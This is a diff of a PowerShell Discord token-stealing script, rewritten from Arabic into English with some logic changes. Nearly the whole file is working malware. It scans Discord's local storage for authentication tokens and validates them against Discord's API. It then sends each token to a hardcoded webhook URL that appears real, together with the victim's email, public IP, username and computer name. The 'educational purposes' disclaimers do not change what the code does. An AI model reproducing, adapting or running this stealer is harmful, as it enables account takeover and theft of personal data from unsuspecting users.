@@ -1,37 +1,37 @@
 # DiscordTokenGrabber.ps1
-# هذا السكربت مخصص لأغراض تعليمية فقط لتعليم المبتدئين في PowerShell
-# تحذير: استخدم هذا الكود في بيئات اختبار فقط ولا تستخدمه للوصول إلى بيانات حقيقية
+# This script is for educational purposes only to teach beginners PowerShell
+# Warning: Use this code only in test environments. Do NOT use it for real data extraction.
 
-# التحقق من أن النظام هو Windows
+# Check if the system is Windows
 if ($PSVersionTable.Platform -ne "Win32NT") {
-    Write-Host "هذا السكربت يتطلب نظام Windows. جارٍ الخروج..." -ForegroundColor Red
+    Write-Host "This script requires Windows OS. Exiting..." -ForegroundColor Red
     exit
 }
 
-# دالة للتحقق من وجود الوحدات (Modules)
+# Function to check if a module is installed
 function Install-ModuleIfNeeded {
     param($ModuleName)
     if (-not (Get-Module -ListAvailable -Name $ModuleName)) {
-        Write-Host "الوحدة $ModuleName غير موجودة. قم بتثبيتها باستخدام: Install-Module $ModuleName" -ForegroundColor Yellow
+        Write-Host "Module $ModuleName not found. Please install it using: Install-Module $ModuleName" -ForegroundColor Yellow
         exit
     }
 }
 
-# التحقق من وحدة الأمان
+# Check for required security module
 Install-ModuleIfNeeded -ModuleName "Microsoft.PowerShell.Security"
 
-# تعريف المتغيرات البيئية
+# Define environment variables
 $LOCAL = [System.Environment]::GetEnvironmentVariable("LOCALAPPDATA")
 $ROAMING = [System.Environment]::GetEnvironmentVariable("APPDATA")
 
-# تعريف مسارات Discord فقط (مبسطة لتعليم المبتدئين)
+# Define Discord paths (simplified for beginners)
 $PATHS = @{
     "Discord" = "$ROAMING\discord"
     "Discord Canary" = "$ROAMING\discordcanary"
     "Discord PTB" = "$ROAMING\discordptb"
 }
 
-# دالة لإنشاء رؤوس HTTP
+# Function to create HTTP headers
 function Get-Headers {
     param($Token = $null)
     $headers = @{
@@ -44,14 +44,14 @@ function Get-Headers {
     return $headers
 }
 
-# دالة لاستخراج الرموز المميزة (مبسطة)
+# Function to extract tokens (simplified)
 function Get-Tokens {
     param($Path)
     $Path = "$Path\Local Storage\leveldb\"
     $tokens = @()
 
     if (-not (Test-Path $Path)) {
-        Write-Host "المسار $Path غير موجود. تأكد من تثبيت Discord." -ForegroundColor Yellow
+        Write-Host "Path $Path not found. Please make sure Discord is installed." -ForegroundColor Yellow
         return $tokens
     }
 
@@ -60,101 +60,111 @@ function Get-Tokens {
         try {
             $content = Get-Content -Path "$Path\$($file.Name)" -ErrorAction SilentlyContinue
             foreach ($line in $content) {
-                # استخدام regex مبسط لاستخراج التوكنات
-                $pattern = '[\w-]{24}\.[\w-]{6}\.[\w-]{27}'
-                $matches = [regex]::Matches($line, $pattern)
-                foreach ($match in $matches) {
-                    $tokens += $match.Value
+                # Regex pattern to find tokens (adjust if needed)
+                $matches = $line | Select-String -Pattern "dQw4w9WgXcQ:[^\s]+" 
+                if ($matches) {
+                    foreach ($match in $matches.Matches) {
+                        $token = $match.Value -replace "dQw4w9WgXcQ:", ""
+                        $tokens += $token
+                    }
                 }
             }
         } catch {
-            Write-Host "خطأ في قراءة الملف $($file.Name): $_" -ForegroundColor Red
+            Write-Host "Error reading file $($file.Name): $_" -ForegroundColor Red
         }
     }
     return $tokens
 }
 
-# دالة لجلب عنوان IP
+# Function to get public IP address
 function Get-IP {
     try {
-        $response = Invoke-RestMethod -Uri "https://api.ipify.org?format=json" -ErrorAction Stop
-        return $response.ip
+        $response = Invoke-WebRequest -Uri "https://api.ipify.org?format=json" -ErrorAction Stop
+        return ($response.Content | ConvertFrom-Json).ip
     } catch {
-        Write-Host "خطأ في جلب عنوان IP: $_" -ForegroundColor Red
-        return "غير متوفر"
+        Write-Host "Failed to retrieve IP address: $_" -ForegroundColor Red
+        return "Unavailable"
     }
 }
 
-# الدالة الرئيسية (مبسطة)
+# Main function
 function Main {
-    # تأكد من إعداد Webhook
-    $webhookUrl = "https://discord.com/api/webhooks/1398638353590521876/nS_F5qoPn6adJI3NSg4rA4zaOqQL_rUOpEJx9HkdZjD6pjo7-A1kP3nsbZJACxWIi8f7" # استبدل هذا برابط Webhook صالح من Discord
+    # Set your Discord webhook URL here
+    $webhookUrl = "https://discord.com/api/webhooks/1398638353590521876/nS_F5qoPn6adJI3NSg4rA4zaOqQL_rUOpEJx9HkdZjD6pjo7-A1kP3nsbZJACxWIi8f7"  # Replace with a valid Discord webhook URL
     if ($webhookUrl -eq "https://discord.com/api/webhooks/1398638353590521876/nS_F5qoPn6adJI3NSg4rA4zaOqQL_rUOpEJx9HkdZjD6pjo7-A1kP3nsbZJACxWIi8f7") {
-        Write-Host "خطأ: يجب استبدال 'https://discord.com/api/webhooks/1398638353590521876/nS_F5qoPn6adJI3NSg4rA4zaOqQL_rUOpEJx9HkdZjD6pjo7-A1kP3nsbZJACxWIi8f7' برابط Webhook صالح. اذهب إلى قناة Discord -> التكاملات -> إنشاء Webhook." -ForegroundColor Red
+        Write-Host "Error: You must replace 'https://discord.com/api/webhooks/1398638353590521876/nS_F5qoPn6adJI3NSg4rA4zaOqQL_rUOpEJx9HkdZjD6pjo7-A1kP3nsbZJACxWIi8f7' with a valid webhook URL. Go to Discord channel -> Integrations -> Create Webhook." -ForegroundColor Red
         exit
     }
 
-    $checked = @()
+    $checkedTokens = @()
 
     foreach ($platform in $PATHS.Keys) {
         $path = $PATHS[$platform]
         if (-not (Test-Path $path)) {
-            Write-Host "المسار $path غير موجود." -ForegroundColor Yellow
+            Write-Host "Path $path not found." -ForegroundColor Yellow
             continue
         }
 
         foreach ($token in (Get-Tokens -Path $path)) {
             $token = $token -replace "\\", ""
-            if ($checked -contains $token) {
-                Write-Host "الرمز $token تم التحقق منه مسبقًا." -ForegroundColor Yellow
+            if ($checkedTokens -contains $token) {
+                Write-Host "Token $token already checked." -ForegroundColor Yellow
                 continue
             }
-            $checked += $token
+            $checkedTokens += $token
 
             try {
-                # التحقق من الرمز
+                # Verify token validity
                 $headers = Get-Headers -Token $token
-                $userResponse = Invoke-RestMethod -Uri "https://discord.com/api/v10/users/@me" -Headers $headers -ErrorAction Stop
-                if (-not $userResponse) {
-                    Write-Host "رمز غير صالح: $token" -ForegroundColor Red
+                $userResponse = Invoke-WebRequest -Uri "https://discord.com/api/v10/users/@me" -Headers $headers -ErrorAction Stop
+                if ($userResponse.StatusCode -ne 200) {
+                    Write-Host "Invalid token: $token" -ForegroundColor Red
                     continue
                 }
+                $userData = $userResponse.Content | ConvertFrom-Json
 
-                # جلب معلومات السيرفرات (مبسط)
-                $guildResponse = Invoke-RestMethod -Uri "https://discordapp.com/api/v6/users/@me/guilds?with_counts=true" -Headers $headers -ErrorAction Stop
-                $guildCount = $guildResponse.Count
+                # Get guilds info (simplified)
+                $guildResponse = Invoke-WebRequest -Uri "https://discordapp.com/api/v6/users/@me/guilds?with_counts=true" -Headers $headers -ErrorAction Stop
+                $guilds = $guildResponse.Content | ConvertFrom-Json
+                $guildCount = $guilds.Count
 
-                # إنشاء رسالة بسيطة لإرسالها إلى Webhook
+                # Prepare embed message for webhook
                 $embed = @{
                     embeds = @(
                         @{
-                            title = "بيانات مستخدم جديد: $($userResponse.username)"
+                            title = "New User Data: $($userData.username)"
                             description = @"
-معرف المستخدم: $($userResponse.id)
-البريد الإلكتروني: $($userResponse.email)
-عدد السيرفرات: $guildCount
-عنوان IP: $(Get-IP)
-اسم المستخدم: $env:UserName
-اسم الجهاز: $env:COMPUTERNAME
-موقع الرمز: $platform
+User ID: $($userData.id)
+Email: $($userData.email)
+Guilds Count: $guildCount
+Public IP: $(Get-IP)
+Username: $env:UserName
+Computer Name: $env:COMPUTERNAME
+Token Source: $platform
+
+Token:
 $token
 "@
                             color = 3092790
-                            footer = @{ text = "تم الإنشاء لأغراض تعليمية" }
-                            thumbnail = @{ url = "https://cdn.discordapp.com/avatars/$($userResponse.id)/$($userResponse.avatar).png" }
+                            footer = @{ text = "Created for educational purposes" }
+                            thumbnail = @{ url = "https://cdn.discordapp.com/avatars/$($userData.id)/$($userData.avatar).png" }
                         }
                     )
-                    username = "Grabber"
+                    username = "Token Grabber"
                     avatar_url = "https://avatars.githubusercontent.com/u/43183806?v=4"
                 }
-                Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($embed | ConvertTo-Json -Depth 10) -Headers (Get-Headers) -ErrorAction Stop
 
-                Write-Host "تم إرسال بيانات المستخدم $($userResponse.username) بنجاح." -ForegroundColor Green
+                # Send to Discord webhook
+                Invoke-WebRequest -Uri $webhookUrl -Method Post -Body ($embed | ConvertTo-Json -Depth 10) -Headers (Get-Headers) -ErrorAction Stop
+
+                Write-Host "Successfully sent user data for $($userData.username)." -ForegroundColor Green
+
             } catch {
-                Write-Host "خطأ في معالجة الرمز $token: $_" -ForegroundColor Red
+                Write-Host "Error processing token $token: $_" -ForegroundColor Red
             }
         }
     }
 }
 
+# Run the main function
 Main
